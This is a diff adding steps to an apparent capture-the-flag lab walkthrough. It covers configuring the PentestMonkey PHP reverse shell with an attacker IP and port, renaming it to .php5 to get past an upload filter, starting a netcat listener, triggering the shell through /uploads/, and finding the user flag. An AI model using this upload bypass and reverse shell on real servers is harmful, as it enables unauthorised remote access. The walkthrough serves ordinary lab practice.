@@ -68,7 +68,56 @@ You should see a file upload page.
 
 <img width="975" height="587" alt="panel" src="https://github.com/user-attachments/assets/079b70dd-62cb-48af-85e0-7312dc5172ac" />
 
+You can download the PentestMonkey PHP Reverse Shell from the official PentestMonkey website:
 
+PentestMonkey PHP Reverse Shell
+
+Website: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+Or I use Github 
+
+GitHub: https://github.com/pentestmonkey/php-reverse-shell
+
+Steps: 
+step 1: Visit the PentestMonkey page.
+step 2: Download the php-reverse-shell.php file.
+
+step 3: Open it in Kali:
+
+       nano php-reverse-shell.php
+
+step 4: Modify these lines with your Kali/AttackBox IP and the port you want to listen on:
+
+      $ip = 'YOUR_KALI_IP';
+      $port = 4444;
+      
+step 5: Save the file (Ctrl + O, Enter, Ctrl + X).
+
+step 6: Rename it to bypass the upload restriction:
+
+      mv php-reverse-shell.php shell.php5
+
+step 7: Start a Netcat listener:
+
+      nc -lvnp 4444
+      
+Upload shell.php5 through the /panel/ page and then access it from the /uploads/ directory to receive the reverse shell.
+
+<img width="712" height="605" alt="Screenshot 2026-07-15 191137" src="https://github.com/user-attachments/assets/a8448087-ec51-42a3-b5cd-e71950a7388c" />
+
+after it get uploaded, click on the shell.php5 file to activate the reverse shell
+
+<img width="585" height="262" alt="Screenshot 2026-07-15 191212" src="https://github.com/user-attachments/assets/ebbc32e4-bfc8-4ea9-9dbf-121ec685cafb" />
+
+
+got the shell
+
+<img width="825" height="210" alt="image" src="https://github.com/user-attachments/assets/23b532e6-bac5-4fd0-973c-3441993220da" />
+
+
+I find the user flag in the “/var/www” directory.
+
+<img width="219" height="117" alt="image" src="https://github.com/user-attachments/assets/e040ea68-ca79-4dd5-a2d9-5e7a50928c5e" />
 
 
 
